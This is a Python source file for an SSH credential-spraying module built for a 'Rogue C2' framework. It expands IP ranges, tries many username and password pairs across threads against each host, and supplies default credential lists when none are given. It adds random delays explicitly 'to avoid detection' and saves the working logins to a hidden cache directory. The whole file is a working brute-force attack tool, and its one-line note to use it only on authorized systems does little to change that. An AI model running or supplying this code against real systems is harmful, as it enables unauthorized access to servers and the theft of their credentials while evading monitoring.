#!/usr/bin/env python3
"""
PAYLOAD: SSH Credential Spraying Module
DESCRIPTION: Attempts SSH authentication with provided credentials
AUTHOR: Rogue Red Team
VERSION: 2.0
SECURITY: This tool attempts authentication - Use only on authorized systems
"""
import paramiko, socket, threading, queue, time, json, datetime, os, sys
import ipaddress, random, hashlib, base64

class SSHSprayer:
    def __init__(self, targets=None, usernames=None, passwords=None, 
                 threads=5, timeout=5, output_dir="~/.cache/.rogue/ssh_spray"):
        self.targets = targets or []
        self.usernames = usernames or []
        self.passwords = passwords or []
        self.threads = threads
        self.timeout = timeout
        self.output_dir = os.path.expanduser(output_dir)
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.results = {
            "successful": [],
            "failed": [],
            "errors": []
        }
        
        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
    
    def load_targets_from_file(self, filepath):
        """Load targets from file (one per line)"""
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                self.targets = [line.strip() for line in f if line.strip()]
    
    def load_credentials_from_file(self, username_file, password_file):
        """Load credentials from files"""
        if os.path.exists(username_file):
            with open(username_file, 'r') as f:
                self.usernames = [line.strip() for line in f if line.strip()]
        
        if os.path.exists(password_file):
            with open(password_file, 'r') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
    
    def generate_common_credentials(self):
        """Generate common credential pairs if none provided"""
        if not self.usernames:
            self.usernames = [
                'root', 'admin', 'ubuntu', 'test', 'user', 
                'pi', 'oracle', 'postgres', 'mysql', 'guest'
            ]
        
        if not self.passwords:
            self.passwords = [
                'password', '123456', 'admin', 'root', 'test',
                'password123', 'admin123', 'root123', 'toor',
                'raspberry', 'ubuntu', 'changeme', 'default'
            ]
    
    def expand_target_ranges(self):
        """Expand CIDR ranges and host ranges"""
        expanded_targets = []
        
        for target in self.targets:
            try:
                # Check if it's a CIDR range
                if '/' in target:
                    network = ipaddress.ip_network(target, strict=False)
                    for ip in network.hosts():
                        expanded_targets.append(str(ip))
                # Check if it's a range (e.g., 192.168.1.1-100)
                elif '-' in target and target.count('.') == 3:
                    base, range_part = target.rsplit('.', 1)
                    start, end = map(int, range_part.split('-'))
                    for i in range(start, end + 1):
                        expanded_targets.append(f"{base}.{i}")
                else:
                    expanded_targets.append(target)
            except:
                expanded_targets.append(target)
        
        self.targets = expanded_targets
    
    def try_ssh_login(self, target, username, password):
        """Attempt SSH login with given credentials"""
        try:
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect
            client.connect(
                hostname=target,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # Connection successful
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            with self.lock:
                self.results["errors"].append({
                    "target": target,
                    "username": username,
                    "error": f"SSH Error: {str(e)[:100]}"
                })
            return False
        except socket.error as e:
            with self.lock:
                self.results["errors"].append({
                    "target": target,
                    "username": username,
                    "error": f"Socket Error: {str(e)[:100]}"
                })
            return False
        except Exception as e:
            with self.lock:
                self.results["errors"].append({
                    "target": target,
                    "username": username,
                    "error": f"Unexpected Error: {str(e)[:100]}"
                })
            return False
    
    def worker(self):
        """Worker thread for processing tasks"""
        while True:
            try:
                task = self.task_queue.get(timeout=1)
                if task is None:
                    break
                
                target, username, password = task
                
                print(f"[*] Trying {username}:{password} @ {target}")
                
                if self.try_ssh_login(target, username, password):
                    with self.lock:
                        self.results["successful"].append({
                            "target": target,
                            "username": username,
                            "password": password,
                            "timestamp": datetime.datetime.now().isoformat()
                        })
                        print(f"[+] SUCCESS: {username}:{password} @ {target}")
                else:
                    with self.lock:
                        self.results["failed"].append({
                            "target": target,
                            "username": username,
                            "password": password
                        })
                
                self.task_queue.task_done()
                
                # Random delay to avoid detection
                time.sleep(random.uniform(0.1, 1.0))
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"[!] Worker error: {e}")
                continue
    
    def execute(self):
        """Execute SSH spray attack"""
        try:
            print("[+] Starting SSH credential spray...")
            
            # Generate credentials if none provided
            if not self.usernames or not self.passwords:
                self.generate_common_credentials()
            
            # Expand target ranges
            self.expand_target_ranges()
            
            print(f"[+] Targets: {len(self.targets)}")
            print(f"[+] Usernames: {len(self.usernames)}")
            print(f"[+] Passwords: {len(self.passwords)}")
            print(f"[+] Total attempts: {len(self.targets) * len(self.usernames) * len(self.passwords)}")
            
            if not self.targets:
                return "[!] No targets specified"
            
            # Create tasks
            for target in self.targets:
                for username in self.usernames:
                    for password in self.passwords:
                        self.task_queue.put((target, username, password))
            
            # Start worker threads
            threads = []
            for i in range(self.threads):
                thread = threading.Thread(target=self.worker)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Wait for all tasks to complete
            self.task_queue.join()
            
            # Stop workers
            for i in range(self.threads):
                self.task_queue.put(None)
            
            for thread in threads:
                thread.join()
            
            # Generate report
            report = {
                "timestamp": datetime.datetime.now().isoformat(),
                "parameters": {
                    "targets_count": len(self.targets),
                    "usernames_count": len(self.usernames),
                    "passwords_count": len(self.passwords),
                    "threads": self.threads,
                    "timeout": self.timeout
                },
                "results": {
                    "successful": len(self.results["successful"]),
                    "failed": len(self.results["failed"]),
                    "errors": len(self.results["errors"])
                },
                "credentials": self.results["successful"],
                "sample_errors": self.results["errors"][:10] if self.results["errors"] else []
            }
            
            # Save results
            output_file = os.path.join(self.output_dir, f"ssh_spray_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            
            # Save successful credentials in separate file
            creds_file = os.path.join(self.output_dir, f"ssh_credentials_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            with open(creds_file, 'w') as f:
                for cred in self.results["successful"]:
                    f.write(f"{cred['target']}:{cred['username']}:{cred['password']}\n")
            
            print(f"[+] SSH spray complete. Found {len(self.results['successful'])} valid credentials.")
            print(f"[+] Results saved to: {output_file}")
            print(f"[+] Credentials saved to: {creds_file}")
            
            return json.dumps(report["results"], indent=2)
            
        except Exception as e:
            return f"[!] SSH spray failed: {str(e)}"

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue SSH Spray')
    parser.add_argument('--targets', help='Target IPs or ranges (comma-separated or file)')
    parser.add_argument('--target-file', help='File containing targets (one per line)')
    parser.add_argument('--usernames', help='Usernames (comma-separated or file)')
    parser.add_argument('--username-file', help='File containing usernames')
    parser.add_argument('--passwords', help='Passwords (comma-separated or file)')
    parser.add_argument('--password-file', help='File containing passwords')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout')
    
    args, unknown = parser.parse_known_args()
    
    # Initialize sprayer
    sprayer = SSHSprayer(threads=args.threads, timeout=args.timeout)
    
    # Load targets
    if args.target_file:
        sprayer.load_targets_from_file(args.target_file)
    elif args.targets:
        sprayer.targets = [t.strip() for t in args.targets.split(',')]
    
    # Load credentials
    if args.username_file or args.password_file:
        sprayer.load_credentials_from_file(
            args.username_file or '',
            args.password_file or ''
        )
    elif args.usernames and args.passwords:
        sprayer.usernames = [u.strip() for u in args.usernames.split(',')]
        sprayer.passwords = [p.strip() for p in args.passwords.split(',')]
    
    return sprayer.execute()

if __name__ == "__main__":
    # Example usage when run directly
    sprayer = SSHSprayer(
        targets=["192.168.1.1-10"],
        usernames=["root", "admin"],
        passwords=["password", "123456"],
        threads=3
    )
    print(sprayer.execute())
